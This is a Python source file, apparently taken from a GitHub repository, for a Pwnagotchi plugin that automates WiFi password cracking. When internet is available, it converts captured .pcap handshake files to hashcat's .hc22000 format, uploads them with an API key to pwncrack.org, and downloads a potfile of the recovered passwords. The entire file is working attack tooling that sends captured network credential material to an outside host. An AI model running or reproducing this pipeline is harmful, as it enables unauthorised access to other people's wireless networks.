# CODE IS FROM https://github.com/Terminatoror/pwncrack-addons/blob/main/pwncrack.py
import time
import os
import subprocess
import requests
import logging
import socket
from pwnagotchi.plugins import Plugin
import pwnagotchi

class UploadConvertPlugin(Plugin):
    __author__ = 'Terminatoror'
    __version__ = '1.0.1'
    __license__ = 'GPL3'
    __description__ = 'Converts .pcap files to .hc22000 and uploads them to pwncrack.org when internet is available.'

    def __init__(self):
        self.server_url = 'http://pwncrack.org/upload_handshake'  # Leave this as is
        self.potfile_url = 'http://pwncrack.org/download_potfile_script'  # Leave this as is
        self.timewait = 600
        self.last_run_time = 0
        self.key = ""

    def on_loaded(self):
        logging.info('[pwncrack] loading')

    def on_config_changed(self, config):
        self.handshake_dir = config["bettercap"].get("handshakes")
        self.key = self.options.get('key', "")  # Change this to your key
        self.whitelist = config["main"].get("whitelist", [])
        self.combined_file = os.path.join(self.handshake_dir, 'combined.hc22000')
        self.potfile_path = os.path.join(self.handshake_dir, 'cracked.pwncrack.potfile')
        self.last_upload_path = os.path.join(self.handshake_dir, '.pwncrack_last_up')
        self.timewait = self.options.get('timewait', 600)

    def on_internet_available(self, agent):
        current_time = time.time()
        remaining_wait_time = self.timewait - (current_time - self.last_run_time)
        if remaining_wait_time > 0:
            logging.debug(f"[pwncrack] Waiting {remaining_wait_time:.1f} more seconds before next run.")
            return
        self.last_run_time = current_time
        if self.key == "":
            logging.warn("PWNCrack enabled, but no api key specified. Add a key to config.toml")
            return

        logging.info(f"[pwncrack] Running upload process. waiting: {self.timewait} seconds.")
        try:
            self._convert_and_upload()
            self._download_potfile()
            self.last_run_time = current_time
        except Exception as e:
            logging.error(f"[pwncrack] Error occurred during upload process: {e}", exc_info=True)

    def _convert_and_upload(self):
        # Convert all .pcap files to .hc22000, excluding files matching whitelist items
        last_up_time = os.path.getmtime(self.last_upload_path) if os.path.isfile(self.last_upload_path) else 0
        pcap_files = [f for f in os.listdir(self.handshake_dir)
                      if f.endswith('.pcap') and os.path.getmtime(os.path.join(self.handshake_dir,f)) > last_up_time and not any(item in f for item in self.whitelist)]
        if pcap_files:
            tmp_file = os.path.join(self.handshake_dir, '.pwncrack_uploading')
            with open(tmp_file, 'w') as fout:
                fout.write("\n".join(pcap_files))

            # write list of files to a temporary marker file. move to real path if success
            for pcap_file in pcap_files:
                subprocess.run(['hcxpcapngtool', '-o', self.combined_file, os.path.join(self.handshake_dir, pcap_file)])
                self.last_run_time = time.time()   # because it can take a while with a lot of pcaps

            # Ensure the combined file is created
            if not os.path.exists(self.combined_file):
                open(self.combined_file, 'w').close()

            # Upload the combined .hc22000 file
            with open(self.combined_file, 'rb') as file:
                files = {'handshake': file}
                data = {'key': self.key}
                response = requests.post(self.server_url, files=files, data=data)

            # Log the response
            logging.info(f"[pwncrack] Upload response: {response.json()}")
            if response.status_code == 200:
                # move temporary marker file in place for next check
                os.rename(tmp_file, self.last_upload_path)
            os.remove(self.combined_file)  # Remove the combined.hc22000 file
        else:
            logging.info("[pwncrack] No .pcap files found to convert (or all files are whitelisted).")

    def _download_potfile(self):
        response = requests.get(self.potfile_url, params={'key': self.key})
        if response.status_code == 200:
            with open(self.potfile_path, 'w') as file:
                file.write(response.text)
            logging.info(f"[pwncrack] Potfile downloaded to {self.potfile_path}")
        else:
            logging.error(f"[pwncrack] Failed to download potfile: {response.status_code}")
            logging.error(f"[pwncrack] {response.json()}")  # Log the error message from the server

    def on_unload(self, ui):
        logging.info('[pwncrack] unloading')